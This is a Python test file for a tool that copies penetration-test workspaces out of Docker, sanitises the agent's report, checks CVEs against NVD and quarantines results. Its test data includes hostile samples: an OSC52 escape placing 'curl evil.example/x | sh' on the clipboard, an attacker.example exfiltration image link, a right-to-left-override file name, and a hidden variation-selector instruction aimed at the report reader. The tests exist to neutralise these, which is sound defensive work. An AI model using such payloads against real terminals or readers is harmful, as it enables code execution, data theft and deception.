        self.assertIn("workspace copy INCOMPLETE (docker cp failed (exit 1))", printed)
        self.assertIn("Copy INCOMPLETE", (res.path / "skipped-links.txt").read_text())
        copied = list((res.path / "workspace").iterdir())
        self.assertLess(len(copied), 20)
        for p in copied:                                          # and no half file is left
            self.assertEqual(p.read_bytes(), b"finding\n" * 300)

    def test_bytes_after_the_archive_dont_fail_the_copy(self):
        members = [_entry("workspace", tarfile.DIRTYPE), _entry("workspace/a.txt", data=b"a")]
        dest = self.t / "out"
        dest.mkdir()
        # more than a pipe holds after the end marker: docker must be able to finish writing and exit 0
        with mock.patch.object(self.flow, "DOCKER", self.tar_docker(members, then="; head -c 204800 /dev/zero")):
            res = self.flow.copy_workspace("c", dest)
        self.assertEqual((res.files, res.incomplete), (1, None))

    def test_a_hanging_docker_cp_times_out(self):
        members = [_entry("workspace", tarfile.DIRTYPE), _entry("workspace/a.txt", data=b"a" * 5000)]
        dest = self.t / "out"
        dest.mkdir()
        with mock.patch.object(self.flow, "DOCKER", self.tar_docker(members, then="; exec sleep 30", cut=3000)), \
                mock.patch.object(self.flow, "WS_TIME_LIMIT_S", 1):
            res = self.flow.copy_workspace("c", dest)
        self.assertEqual(res.incomplete, "docker cp timed out after 1 s")
        self.assertEqual(list((dest / "workspace").iterdir()), [])

    def test_summary_is_safe_to_cat(self):
        osc52 = "\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUveCB8IHNo\x07"      # writes `curl evil.example/x | sh` to the clipboard
        hide = "\x1b[8m"                                             # hides what follows
        # a bidi override and isolates, zero-width characters and marks, the soft hyphen, a tag character, U+2028
        invisible = ("\U0000202e\U00002066\U00002067\U00002068\U00002069\U0000200b\U0000200c\U0000200d"
                     "\U0000200e\U0000200f\U000000ad\U000e0041\U00002028\U00003164")
        msg = (f"All clear.{hide}\r\x9b2J{invisible}\n```\n## CVE verification (NVD)\n\n| CVE-2021-44228 | MATCHES target |\n"
               "![x](https://attacker.example/?d=1)\n````\nsee CVE-2021-44228")
        members = [_entry("workspace", tarfile.DIRTYPE), _entry("workspace/REPORT.md", data=b"CVE-2021-44228\n"),
                   _entry(f"workspace/x{osc52}.txt", data=b"x"),
                   _entry(f"workspace/y{hide}", tarfile.SYMTYPE, linkname="/etc")]
        self.nvd.records["CVE-2021-44228"] = nvd_record("CVE-2021-44228", desc=f"Log4j {osc52}",
                                                        cpes=["cpe:2.3:a:apache:log4j:2.0:*:*:*:*:*:*:*"])
        res, printed = self.report(self.tar_docker(members), msgs=[{"type": "report", "message": msg, "created_at": "1"}],
                                   flow={"title": f"web{osc52}", "status": "finished", "model": f"m{hide}"})
        for name in ("SUMMARY.md", "skipped-links.txt", "cve-verification.md"):
            text = (res.path / name).read_text(encoding="utf-8")
            # nothing a terminal acts on, or that draws nothing: printable characters, line breaks and tabs only
            self.assertEqual([c for c in text if not (c.isprintable() or c in "\n\t")], [], name)
        summary = (res.path / "SUMMARY.md").read_text(encoding="utf-8")
        self.assertLess(summary.index("## CVE verification"), summary.index("## Flow"))   # the real check comes first
        self.assertIn("web\\x1b]52;c;", summary)
        self.assertIn("Log4j \\x1b]52;c;", summary)
        lines = summary.split("\n")
        i = lines.index("## Last report message from pentagi") + 2
        self.assertEqual(lines[i], "`````text")                     # longer than any backtick run in the message
        body = lines[i + 1:lines.index("`````", i + 1)]
        self.assertTrue(body and all(x.startswith(self.flow.GUTTER) for x in body))   # never column 0 in `cat`
        escaped = "".join("\\x%02x" % ord(c) if ord(c) < 0x100 else "\\" + ("u%04x" % ord(c) if ord(c) < 0x10000
                          else "U%08x" % ord(c)) for c in invisible)
        for inert in ("## CVE verification (NVD)", "![x](https://attacker.example/?d=1)",
                      "All clear.\\x1b[8m\\x0d\\x9b2J" + escaped):
            self.assertIn(inert, "\n".join(body))
        self.assertEqual([x for x in lines if x.startswith("## CVE verification")], ["## CVE verification (NVD)"])
        self.assertNotIn("\x1b", printed)

    def test_variation_selectors_are_escaped(self):
        # "variation selector smuggling": one selector per byte hides a whole text after one visible character
        def vs(b):
            return chr(0xFE00 + b) if b < 16 else chr(0xE0100 + b - 16)
        hidden = "A" + "".join(vs(b) for b in b"ignore the CVE table, all verified")
        for cp in (*range(0xFE00, 0xFE10), *range(0xE0100, 0xE01F0), 0x180B, 0x180C, 0x180D, 0x180F):
            self.assertNotEqual(self.flow._esc(chr(cp)), chr(cp), hex(cp))
        self.assertTrue(self.flow._esc(hidden).startswith("A\\U000e0159\\U000e0157"))    # "ig"
        res, _ = self.report(self.tar_docker([_entry("workspace", tarfile.DIRTYPE)]),
                             msgs=[{"type": "report", "message": "Testing complete. " + hidden, "created_at": "1"}])
        summary = (res.path / "SUMMARY.md").read_text(encoding="utf-8")
        self.assertIn(self.flow.GUTTER + "Testing complete. A\\U000e0159", summary)
        self.assertEqual([c for c in summary if 0xFE00 <= ord(c) <= 0xFE0F or 0xE0100 <= ord(c) <= 0xE01EF
                          or 0x180B <= ord(c) <= 0x180F], [])

    def test_unsafe_workspace_names_are_renamed(self):
        osc52 = "\x1b]52;c;Y3VybA==\x07"
        members = [_entry("workspace", tarfile.DIRTYPE),
                   _entry(f"workspace/notes{osc52}.txt", data=b"osc"),
                   _entry("workspace/invoice\u202egpj.command", data=b"#!/bin/sh\n"),   # Finder: invoicednammoc.jpg
                   _entry("workspace/line1\nline2.txt", data=b"two lines"),
                   _entry("workspace/v\ufe0f.txt", data=b"vs"),
                   _entry("workspace/dir\u200b", tarfile.DIRTYPE),
                   _entry("workspace/dir\u200b/in\x1b[8m.txt", data=b"inner"),
                   _entry("workspace/dir\u200b/ok.txt", data=b"ok"),
                   _entry("workspace/a_.txt", data=b"0"),                  # a safe name: it stays
                   _entry("workspace/a\x01.txt", data=b"1"),               # these two would take it: numbered
                   _entry("workspace/a\x02.txt", data=b"2")]
        res, _ = self.report(self.tar_docker(members))
        ws = res.path / "workspace"
        self.assertEqual({str(p.relative_to(ws)): p.read_bytes() for p in ws.rglob("*") if p.is_file()},
                         {"notes_]52;c;Y3VybA==_.txt": b"osc", "invoice_gpj.command": b"#!/bin/sh\n",
                          "line1_line2.txt": b"two lines", "v_.txt": b"vs", "dir_/in_[8m.txt": b"inner",
                          "dir_/ok.txt": b"ok", "a_.txt": b"0", "a_~2.txt": b"1", "a_~3.txt": b"2"})
        self.assertEqual([p.name for p in ws.rglob("*") if self.flow._esc(p.name) != p.name], [])
        summary = (res.path / "SUMMARY.md").read_text(encoding="utf-8")
        self.assertEqual([c for c in summary if not (c.isprintable() or c in "\n\t")], [])
        self.assertIn("(in ./workspace); 8 names renamed (listed below)", summary)
        lines = summary.split("\n")
        i = lines.index("## Renamed in ./workspace") + 4
        self.assertEqual(lines[i], "```text")
        self.assertEqual(lines[i + 1:lines.index("```", i + 1)], [self.flow.GUTTER + x for x in (
            "workspace/a\\x01.txt  ->  workspace/a_~2.txt",
            "workspace/a\\x02.txt  ->  workspace/a_~3.txt",
            "workspace/dir\\u200b  ->  workspace/dir_",
            "workspace/invoice\\u202egpj.command  ->  workspace/invoice_gpj.command",
            "workspace/line1\\x0aline2.txt  ->  workspace/line1_line2.txt",
            "workspace/notes\\x1b]52;c;Y3VybA==\\x07.txt  ->  workspace/notes_]52;c;Y3VybA==_.txt",
            "workspace/v\\ufe0f.txt  ->  workspace/v_.txt",
            "workspace/dir\\u200b/in\\x1b[8m.txt  ->  workspace/dir_/in_[8m.txt")])
        self.assertIn(self.flow.GUTTER + "workspace/invoice_gpj.command  (10 B)", summary)   # the index: new names

    def test_renaming_never_follows_links_and_fits_names(self):
        root, outside = self.t / "copy" / "workspace", self.t / "outside"
        root.mkdir(parents=True)
        outside.mkdir()
        (outside / "evil\x1b.txt").write_text("x")
        os.symlink(outside, root / "l\x1b")
        for n in (1, 2):                    # 255 bytes each: "_" and a number must still fit in a name
            (root / ("A" * 254 + chr(n))).write_text(str(n))
        moves = self.flow._rename_unsafe(root)
        self.assertEqual([(str(a), str(b)) for a, b in moves],
                         [("workspace/" + "A" * 254 + "\x01", "workspace/" + "A" * 254 + "_"),
                          ("workspace/" + "A" * 254 + "\x02", "workspace/" + "A" * 253 + "~2"),
                          ("workspace/l\x1b", "workspace/l_")])
        self.assertEqual(((root / ("A" * 254 + "_")).read_text(), (root / ("A" * 253 + "~2")).read_text()), ("1", "2"))
        self.assertEqual(os.readlink(root / "l_"), str(outside))         # the link itself is renamed, not followed
        self.assertEqual(sorted(p.name for p in outside.iterdir()), ["evil\x1b.txt"])

    def xattr_stub(self):
        """An xattr stand-in that logs one line per call: its arguments, and whether the folder held workspace/."""
        log, xattr = self.t / "xattr-args", self.t / "xattr"
        xattr.write_text("#!/bin/sh\nlast=\"\"; for a; do last=$a; done\n"
                         f"printf '%s|%s\\n' \"$*\" \"$(ls \"$last\" | tr '\\n' ,)\" >> {shlex.quote(str(log))}\n")
        xattr.chmod(0o755)
        return str(xattr), log

    def test_reports_are_quarantined_on_macos(self):
        xattr, log = self.xattr_stub()
        members = [_entry("workspace", tarfile.DIRTYPE), _entry("workspace/open-me.command", data=b"#!/bin/sh\n")]
        with mock.patch.object(self.flow, "IS_MAC", True), mock.patch.object(self.flow, "XATTR", xattr):
            res, _ = self.report(self.tar_docker(members))
        calls = [line.split("|") for line in log.read_text().splitlines()]
        # first the copy, as soon as it's made and before it's moved into view; then the whole folder
        self.assertEqual([c[0].split(" ")[:3] + c[0].split(" ")[4:] for c in calls],
                         [["-w", "-r", "com.apple.quarantine", str(res.path / ".copying")],
                          ["-w", "-r", "com.apple.quarantine", str(res.path)]])
        self.assertEqual(calls[0][1], "workspace,")
        self.assertRegex(calls[0][0].split(" ")[3], r"^0081;[0-9a-f]{8};secstack;$")
        self.assertFalse((res.path / ".copying").exists())
        self.assertTrue((res.path / "workspace" / "open-me.command").exists())
        err = io.StringIO()
        with mock.patch.object(self.flow, "IS_MAC", True), mock.patch.object(self.flow, "XATTR", str(self.t / "none")), \
                contextlib.redirect_stderr(err):
            self.report(self.tar_docker(members, name="ws2.tar"))
        self.assertIn("quarantine", err.getvalue())

    def test_an_interrupted_report_is_still_quarantined(self):
        xattr, log = self.xattr_stub()
        members = [_entry("workspace", tarfile.DIRTYPE), _entry("workspace/open-me.command", data=b"#!/bin/sh\n"),
                   _entry("workspace/REPORT.md", data=b"CVE-2021-44228")]
        with mock.patch.object(self.flow, "IS_MAC", True), mock.patch.object(self.flow, "XATTR", xattr), \
                mock.patch.object(self.flow, "verify_cves", mock.MagicMock(side_effect=KeyboardInterrupt)), \
                self.assertRaises(KeyboardInterrupt):     # Ctrl-C during the NVD checks
            self.report(self.tar_docker(members))
        out = next((self.secops / "reports").iterdir())
        targets = [line.split("|")[0].split(" ")[-1] for line in log.read_text().splitlines()]
        self.assertEqual(targets, [str(out / ".copying"), str(out)])
        self.assertTrue((out / "workspace" / "open-me.command").exists())

    # ------------------------------------------------------------ SIGTERM (`secstack watch stop`, stop, down, artex)
    def term_child(self, stall=False, cmd=("report", "7")):
        """Run main() with cmd in a child process of its own (TERM_CHILD). Stand-ins: docker (cp sends 30000 bytes,
        a whole open-me.command and half of z.txt, then with stall waits for the file go), xattr (marking the
        report folder creates started, then waits for go2; logs its target and the files under it) and `secstack
        down` (sends SIGTERM to its parent as watch_stop does, then finishes a second later)."""
        import signal
        q = shlex.quote
        s = types.SimpleNamespace(**{k: self.t / k for k in ("go", "go2", "started", "xlog", "downlog")})
        self.tar_docker([_entry("workspace", tarfile.DIRTYPE), _entry("workspace/open-me.command", data=b"#!/bin/sh\n"),
                         _entry("workspace/z.txt", data=b"z" * 100000)])
        tar = q(str(self.t / "ws.tar"))
        docker = self.stub(f"head -c 30000 {tar}; while [ ! -e {q(str(s.go))} ]; do sleep 0.05; done; "
                           f"exec tail -c +30001 {tar}" if stall else f"exec cat {tar}")
        xattr, down = self.t / "xattr", self.t / "secstack"
        xattr.write_text("#!/bin/sh\nlast=\"\"; for a; do last=$a; done\ncase \"$last\" in */.copying) ;; "
                         f"*) : > {q(str(s.started))}; while [ ! -e {q(str(s.go2))} ]; do sleep 0.05; done ;; esac\n"
                         f"printf '%s|%s\\n' \"$last\" \"$(cd \"$last\" && find . -type f | sort | tr '\\n' ,)\" >> "
                         f"{q(str(s.xlog))}\n")
        down.write_text(f"#!/bin/sh\nkill -TERM $PPID\nsleep 1\necho finished >> {q(str(s.downlog))}\n")
        xattr.chmod(0o755)
        down.chmod(0o755)
        env = dict(os.environ, SECOPS=str(self.secops), PENTAGI_URL="https://127.0.0.1:8443/api/v1")
        with open(self.t / "child.err", "wb") as err:
            p = subprocess.Popen([sys.executable, "-c", TERM_CHILD, str(REPO / "bin" / "secops-flow.py"), docker,
                                  str(xattr), str(down), *cmd], env=env, cwd=str(self.t), stdout=subprocess.DEVNULL,
                                 stderr=err, start_new_session=True)

        def stop():                         # never leave the child or a waiting stand-in behind
            s.go.touch()
            s.go2.touch()
            with contextlib.suppress(OSError):
                os.killpg(p.pid, signal.SIGKILL)
            p.wait()
        self.addCleanup(stop)
        return p, s

    def wait_for(self, done, what, p, timeout=30):
        import time as real_time
        end = real_time.time() + timeout
        while not done():
            if p.poll() is not None or real_time.time() > end:
                self.fail(f"never got to: {what} (exit {p.poll()}): {(self.t / 'child.err').read_text()[-2000:]}")
            real_time.sleep(0.05)

    def test_sigterm_during_the_copy_still_quarantines(self):
        import signal
        import time as real_time
        p, s = self.term_child(stall=True)
        reports = self.secops / "reports"
        self.wait_for(lambda: list(reports.glob("*/.copying/workspace/z.txt")), "the copy, halfway", p)
        real_time.sleep(0.3)                            # the child now waits for z.txt's data from docker
        p.send_signal(signal.SIGTERM)                   # `secstack watch stop` while docker cp is stalled
        s.go.touch()
        self.wait_for(s.started.exists, "the quarantine", p)
        p.send_signal(signal.SIGTERM)                   # a second one must not cut the cleanup short
        s.go2.touch()
        self.assertEqual(p.wait(timeout=60), 143)       # a normal exit: 128 + SIGTERM
        out = next(reports.iterdir())
        ((target, files),) = [line.split("|") for line in s.xlog.read_text().splitlines()]
        self.assertEqual(target, str(out))              # the whole folder, hidden .copying included
        self.assertIn("./.copying/workspace/open-me.command", files.split(","))
        self.assertNotIn("./.copying/workspace/z.txt", files.split(","))        # no half file left

    def test_sigterm_during_the_quarantine_waits_for_it(self):
        import signal
        import time as real_time
        p, s = self.term_child()
        self.wait_for(s.started.exists, "the quarantine of the finished report", p)
        p.send_signal(signal.SIGTERM)
        real_time.sleep(0.3)                            # xattr is still running: it must not be killed
        s.go2.touch()
        self.assertEqual(p.wait(timeout=60), 143)
        out = next((self.secops / "reports").iterdir())
        self.assertEqual([line.split("|")[0] for line in s.xlog.read_text().splitlines()], [str(out / ".copying"), str(out)])

    def test_sigterm_exits_once_and_lets_held_steps_finish(self):
        f = self.flow
        with self.assertRaises(SystemExit) as cm:
            f._on_sigterm(15, None)                 # the first: a normal exit, so `finally` blocks run
        self.assertEqual(cm.exception.code, 143)
        f._on_sigterm(15, None)                     # a second one, during that cleanup: ignored
        g = load("secops_flow_term", REPO / "bin" / "secops-flow.py", {"SECOPS": str(self.secops)})
        steps = []
        with self.assertRaises(SystemExit):
            with g._finish_first():                 # e.g. xattr marking the report folder
                g._on_sigterm(15, None)
                steps.append("finished")            # not cut short; the exit comes right after
        self.assertEqual(steps, ["finished"])
        h = load("secops_flow_term", REPO / "bin" / "secops-flow.py", {"SECOPS": str(self.secops)})
        with self.assertRaises(SystemExit):
            with h._finish_first():
                h._on_sigterm(15, None)
                raise subprocess.TimeoutExpired("xattr", 300)     # the step failed: the SIGTERM still counts

    def test_help_says_what_is_bounded(self):
        doc = " ".join(self.flow.__doc__.split())
        # the budget counts pentagi's JSON as sent; the files are written with non-ASCII escaped
        self.assertIn(f"{self.flow.LOG_BUDGET // 2**20} MiB of pentagi's JSON per log", doc)
        self.assertIn("can be up to about 3 times that", doc)
        cache = doc[doc.index("cached in"):].split(", 1 day")[0]
        for status in self.flow.NVD_FINAL:          # every status that gets the 30-day cache is named
            self.assertIn(status.capitalize(), cache)

    def test_secstack_down_from_the_watcher_is_not_cut_short(self):
        # The watcher gives up (refused token) and runs `secstack down` (--down), which sends SIGTERM to every
        # watcher, this one included: the watcher must wait for it, not kill it halfway.
        p, s = self.term_child(cmd=("watch", "7", "--down"))
        self.assertEqual(p.wait(timeout=60), 1, (self.t / "child.err").read_text()[-2000:])
        self.assertEqual(s.downlog.read_text(), "finished\n")
        self.assertIn("running secstack down", (self.secops / "logs" / "watch-flow7.log").read_text())

    def test_agent_text_has_a_gutter_and_a_line_cap(self):
        fake = "## CVE verification (NVD)\n\n**0 flagged**\n\n| CVE-2024-99999 | MATCHES target | acme:portal | RCE |"
        for msg, shown in (("Testing complete.\n" * 3 + fake, 8), ("\n" * 6000 + fake, 200)):
            with self.subTest(lines=shown):
                res, _ = self.report(self.tar_docker([_entry("workspace", tarfile.DIRTYPE)]),
                                     msgs=[{"type": "report", "message": msg, "created_at": "1"}])
                lines = (res.path / "SUMMARY.md").read_text().split("\n")
                i = lines.index("## Last report message from pentagi") + 2
                end = lines.index(lines[i][:-len("text")], i + 1)
                self.assertEqual(end - i - 1, shown)                          # at most 200 agent lines
                self.assertTrue(all(x.startswith(self.flow.GUTTER) for x in lines[i + 1:end]))
                self.assertEqual([x for x in lines if x.startswith("## CVE verification")], ["## CVE verification (NVD)"])
                self.assertEqual([x for x in lines if x.startswith("**0 flagged**")], [])
                self.assertEqual(lines[end + 1].startswith("(shortened"), shown == 200)

    def test_a_title_with_backticks_stays_in_its_code_span(self):
        for title, shown in (("a`b``c [x](https://attacker.example/?d=1)", "```a`b``c [x](https://attacker.example/?d=1)```"),
                             ("`x`", "`` `x` ``")):
            with self.subTest(title=title):
                res, _ = self.report(self.tar_docker([_entry("workspace", tarfile.DIRTYPE)]),
                                     flow={"title": title, "status": "finished"})
                self.assertIn(f"- Title: {shown}\n", (res.path / "SUMMARY.md").read_text())

    def test_the_top_level_report_md_is_the_native_one(self):
        members = [_entry("workspace", tarfile.DIRTYPE), _entry("workspace/REPORT.md", data=b"CVE-2021-44228\n"),
                   _entry("workspace/CVE-2021-41773-PoC", tarfile.DIRTYPE),            # a cloned PoC sorts first
                   _entry("workspace/CVE-2021-41773-PoC/REPORT.md", data=b"CVE-2021-41773\n")]
        res, _ = self.report(self.tar_docker(members))
        self.assertIn("- Native REPORT.md: yes -> `workspace/REPORT.md`", (res.path / "SUMMARY.md").read_text())
        self.assertEqual([c[0] for c in self.nvd.calls], ["CVE-2021-44228", "CVE-2021-41773"])

    def test_a_hung_docker_doesnt_hold_up_the_report(self):
        import time as real_time
        docker = self.stub("exit 0", inspect="exec sleep 30")         # Docker Desktop wedged
        t0 = real_time.time()
        with mock.patch.object(self.flow, "DOCKER_TIMEOUT_S", 1):
            res, printed = self.report(docker)
        self.assertLess(real_time.time() - t0, 20)
        self.assertEqual(res.incomplete, "docker didn't answer within 1 s")
        self.assertIn("**workspace not copied**: docker didn't answer within 1 s", (res.path / "SUMMARY.md").read_text())
        self.assertIn("workspace copy INCOMPLETE", printed)

    def test_only_the_head_of_each_file_is_searched(self):
        members = [_entry("workspace", tarfile.DIRTYPE),
                   _entry("workspace/scan.txt", data=b"CVE-2021-0001 " + b"x" * 200 + b" CVE-2021-0002")]
        with mock.patch.object(self.flow, "CVE_SCAN_FILE", 100):
            self.report(self.tar_docker(members))
        self.assertEqual([c[0] for c in self.nvd.calls], ["CVE-2021-0001"])

    # ------------------------------------------------------------ flow logs
    def serve_logs(self, logs):
        fake = FakeFlowLogs(logs)
        srv = fake.serve()
        self.addCleanup(srv.server_close)
        self.addCleanup(srv.shutdown)
        p = mock.patch.object(self.flow, "BASE", f"http://127.0.0.1:{srv.server_address[1]}/api/v1")
        p.start()
        self.addCleanup(p.stop)
        return fake

    def test_logs_are_read_within_a_budget(self):
        kib = 2 ** 10
        terms = [{"id": 60, "text": "newest"}, {"id": 59, "text": 64 * 2 ** 20}]      # 64 MiB of output in one row
        terms += [{"id": n, "text": "B" * 3000} for n in range(58, 0, -1)]
        fake = self.serve_logs({"termlogs": terms, "msglogs": [{"id": 2, "type": "report", "text": "done"},
                                                               {"id": 1, "type": "input", "text": "go"}]})
        limits = {"LOG_BUDGET": 256 * kib, "LOG_ROW_MAX": 64 * kib, "LOG_READ_MAX": 2048 * kib, "LOG_FIELD_MAX": 2000}
        with contextlib.ExitStack() as st:
            for k, v in limits.items():
                st.enter_context(mock.patch.object(self.flow, k, v))
            got = self.flow.rows("/flows/7/termlogs/", "termlogs")
            msgs = self.flow.rows("/flows/7/msglogs/", "msglogs")
            st.enter_context(mock.patch.object(self.flow, "DOCKER", self.stub("exit 1", inspect="exit 1")))
            st.enter_context(contextlib.redirect_stdout(io.StringIO()))
            res = self.flow.report(7)
        self.assertTrue(got.truncated)
        self.assertEqual([r["id"] for r in got], list(range(60, 0, -1)))              # the huge row costs only itself
        self.assertEqual(got[1], {"id": 59, "secstack": "row over 64 KiB, not kept (pentagi has it)"})
        self.assertEqual(got[2]["text"], "B" * 2000 + " [secstack: 1000 more characters not kept]")
        self.assertEqual((msgs.truncated, [m["text"] for m in msgs]), (False, ["done", "go"]))
        self.assertTrue(res.logs_cut)
        self.assertLess((res.path / "termlogs.json").stat().st_size, 512 * kib)
        self.assertIn("**TRUNCATED**", (res.path / "SUMMARY.md").read_text())

    def test_the_watcher_counts_messages_without_downloading_them(self):
        fake = self.serve_logs({"msglogs": [{"id": 3, "text": 64 * 2 ** 20}, {"id": 2, "text": "b"}, {"id": 1, "text": "a"}]})
        self.assertEqual(self.flow.msg_total(7), 3)
        ((key, q),) = fake.calls
        self.assertEqual((key, q["pageSize"]), ("msglogs", "1"))
        self.assertGreater(int(q["page"]), 10 ** 6)                     # a page past the end: no message, the total

    # ------------------------------------------------------------ watcher
    def watch(self, down=True, interval=0, **patches):
        """Run the watcher with pentagi, notify, time and `secstack down` faked; returns (rc, log, run, notes)."""
        f, run, notes = self.flow, mock.MagicMock(), []
        base = {"notify": lambda title, text: notes.append(text),
                "time": types.SimpleNamespace(time=lambda: 0.0, sleep=lambda s: None),
                "subprocess": types.SimpleNamespace(run=run, SubprocessError=subprocess.SubprocessError)}
        base.update(patches)
        with contextlib.ExitStack() as st:
            for k, v in base.items():
                st.enter_context(mock.patch.object(f, k, v))
            st.enter_context(contextlib.redirect_stdout(io.StringIO()))
            rc = f.watch(7, interval, 45, down, "")
        log = self.secops / "logs" / "watch-flow7.log"
        return rc, (log.read_text() if log.exists() else ""), run, notes

    def test_watch_gives_up_on_a_refused_token(self):
        rc, log, run, notes = self.watch(api=mock.MagicMock(side_effect=self.flow.ApiError("x", 401)))
        self.assertEqual(rc, 1)
        self.assertIn("API token was refused", log)
        run.assert_called_once_with([self.flow.SECSTACK, "down"])      # --down also when the watcher gives up
        self.assertIn("running secstack down", notes[-1])

    def test_watch_gives_up_when_pentagi_stays_down(self):
        api = mock.MagicMock(side_effect=requests.ConnectionError("refused"))
        rc, log, run, _ = self.watch(api=api)
        self.assertEqual((rc, api.call_count), (1, 30))
        self.assertIn("didn't answer 30 polls", log)
        run.assert_called_once_with([self.flow.SECSTACK, "down"])
        rc, _, run, _ = self.watch(down=False, api=api)
        run.assert_not_called()

    def test_watch_counts_answers_it_cant_read(self):
        for answer in (None, ["not", "a", "flow"]):
            with self.subTest(answer=answer):
                rc, log, run, _ = self.watch(api=lambda *a, **k: answer)
                self.assertEqual(rc, 1)
                self.assertIn("poll error: ValueError", log)
                run.assert_called_once_with([self.flow.SECSTACK, "down"])

    def test_watch_still_shuts_down_when_the_report_fails(self):
        rc, log, run, _ = self.watch(api=lambda *a, **k: {"status": "finished"}, msg_total=lambda fid: 3,
                                     report=mock.MagicMock(side_effect=RuntimeError("boom\x1b[8m")))
        self.assertEqual(rc, 0)
        run.assert_called_once_with([self.flow.SECSTACK, "down"])
        self.assertIn("report failed: RuntimeError: boom\\x1b[8m", log)

    def test_watch_shuts_down_even_when_it_cant_log(self):
        full = self.t / "not-a-folder"          # writing the log fails, as on a full disk
        full.write_text("")
        rc, _, run, _ = self.watch(LOGS=full, api=lambda *a, **k: {"status": "finished"}, msg_total=lambda fid: 3,
                                   report=mock.MagicMock(side_effect=OSError(28, "No space left on device")))
        self.assertEqual(rc, 0)
        run.assert_called_once_with([self.flow.SECSTACK, "down"])

    def test_watch_polls_at_most_once_a_second(self):
        for bad in ("0", "-60", "x"):
            err = io.StringIO()
            with self.subTest(interval=bad), mock.patch.object(sys, "argv", ["secops-flow", "watch", "7", "--interval", bad]), \
                    mock.patch.object(self.flow, "watch") as w, contextlib.redirect_stderr(err), \
                    self.assertRaises(SystemExit):
                self.flow.main()
            w.assert_not_called()
            self.assertIn("1 or more", err.getvalue())
        slept = []
        rc, _, run, _ = self.watch(interval=-60, api=mock.MagicMock(side_effect=requests.ConnectionError("x")),
                                   time=types.SimpleNamespace(time=lambda: 0.0, sleep=slept.append))
        self.assertEqual((rc, set(slept), len(slept)), (1, {1}, 29))     # gave up after 30 polls, not at once
        run.assert_called_once_with([self.flow.SECSTACK, "down"])

    def test_watch_interrupted_leaves_the_stack_up(self):
        for stop in (KeyboardInterrupt(), SystemExit(143)):     # Ctrl-C; SIGTERM (`secstack watch stop`, stop, artex)
            run = mock.MagicMock()
            with self.subTest(stop=type(stop).__name__):
                with mock.patch.object(self.flow, "subprocess", types.SimpleNamespace(run=run)), \
                        mock.patch.object(self.flow, "notify", lambda *a: None), \
                        mock.patch.object(self.flow, "api", mock.MagicMock(side_effect=stop)), \
                        contextlib.redirect_stdout(io.StringIO()), self.assertRaises(type(stop)):
                    self.flow.watch(7, 0, 45, True, "")
                run.assert_not_called()

    def test_watch_notification_mentions_an_incomplete_copy(self):
        done = self.flow.Report(self.t, False, "docker cp failed (exit 1)", 2, 3)
        rc, _, _, notes = self.watch(api=lambda *a, **k: {"status": "finished"}, msg_total=lambda fid: 3,
                                     report=lambda fid, expect: done)
        self.assertEqual(rc, 0)
        self.assertIn("Flow 7 finished; report saved (workspace copy incomplete); 2 CVE IDs flagged", notes)

    def test_notify_never_raises_and_quotes_safely(self):
        calls = []

        def run(args, **kw):
            calls.append(args)
            raise FileNotFoundError("osascript")
        with mock.patch.object(self.flow, "subprocess", types.SimpleNamespace(run=run, SubprocessError=Exception)):
            self.flow.notify('ti"tle\\', 'te"xt\\')
        self.assertEqual(calls[0][2], "display notification \"te'xt/\" with title \"ti'tle/\"")

    # ------------------------------------------------------------ NVD
    def test_nvd_key_is_never_echoed(self):
        key = "0f3c9a2e-7b1d-4c55-9e08-5a6b7c8d9e10"
        (self.secops / "env" / "nvd-api-key").write_text(key + "\nsecond line\n")
        self.nvd.records["CVE-2021-44228"] = nvd_record("CVE-2021-44228")
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            md, _ = self.flow.verify_cves(["CVE-2021-44228"])
        for piece in (key[:8], "second line"):
            self.assertNotIn(piece, md + err.getvalue())
        self.assertIn("single-line API key", err.getvalue())
        self.assertIn("EXISTS", md)                                   # checked, without the key
        self.assertEqual(self.nvd.calls[-1][:2], ("CVE-2021-44228", None))
        (self.secops / "env" / "nvd-api-key").write_text(key + "\n")
        self.flow.verify_cves(["CVE-2021-44229"])
        self.assertEqual(self.nvd.calls[-1][:2], ("CVE-2021-44229", key))

    def test_nvd_errors_show_only_their_type(self):
        self.nvd.replies["CVE-2021-0001"] = (200, b"<html>body-text</html>")
        self.nvd.replies["CVE-2021-0002"] = (500, b"")
        self.nvd.replies["CVE-2021-0003"] = (404, b"")
        md, findings = self.flow.verify_cves(["CVE-2021-0001 CVE-2021-0002 CVE-2021-0003"])
        self.assertIn("lookup failed (JSONDecodeError)", md)
        self.assertIn("NVD answered HTTP 500", md)
        self.assertIn("NVD answered 404", md)
        self.assertNotIn("body-text", md)
        self.assertEqual({f["verdict"] for f in findings}, {"UNVERIFIED (NVD lookup failed)"})

    def test_nvd_lookups_ignore_proxy_settings(self):
        """HTTP(S)_PROXY point at a dead port: lookups go direct, unless SECSTACK_NVD_PROXY names a proxy."""
        self.nvd.records["CVE-2021-44228"] = nvd_record("CVE-2021-44228")
        md, _ = self.flow.verify_cves(["CVE-2021-44228"])
        self.assertIn("EXISTS", md)
        proxy = FakeNvd()
        proxy.records["CVE-2021-44229"] = nvd_record("CVE-2021-44229")
        psrv = proxy.serve()
        self.addCleanup(psrv.server_close)
        self.addCleanup(psrv.shutdown)
        with mock.patch.dict(os.environ, {"SECSTACK_NVD_PROXY": f"http://127.0.0.1:{psrv.server_address[1]}"}):
            md, _ = self.flow.verify_cves(["CVE-2021-44229"])
        self.assertIn("EXISTS", md)
        self.assertEqual([c[0] for c in proxy.calls], ["CVE-2021-44229"])
        self.assertTrue(proxy.calls[0][2].startswith("http://127.0.0.1:"))     # a proxy request (absolute form)
        self.assertNotIn("CVE-2021-44229", [c[0] for c in self.nvd.calls])

    def test_cve_lookups_are_capped_and_prioritised(self):
        ids = [f"CVE-2020-{n:04d}" for n in range(1, 11)]
        members = [_entry("workspace", tarfile.DIRTYPE),
                   _entry("workspace/0-notes.txt", data=" ".join(ids[3:9]).encode()),   # sorts before REPORT.md
                   _entry("workspace/REPORT.md", data=f"{ids[0]} {ids[1]}".encode())]
        msgs = [{"type": "report", "message": ids[9], "created_at": "1"},
                {"type": "report", "message": ids[2], "created_at": "2"}]                  # the newest counts first
        with mock.patch.object(self.flow, "NVD_MAX_IDS", 3):
            res, _ = self.report(self.tar_docker(members), msgs=msgs)
        self.assertEqual([c[0] for c in self.nvd.calls], ids[:3])
        md = (res.path / "cve-verification.md").read_text()
        self.assertIn("10 CVE IDs found, 3 checked", md)
        self.assertEqual(md.count("NOT CHECKED (over 3 IDs)"), 7)
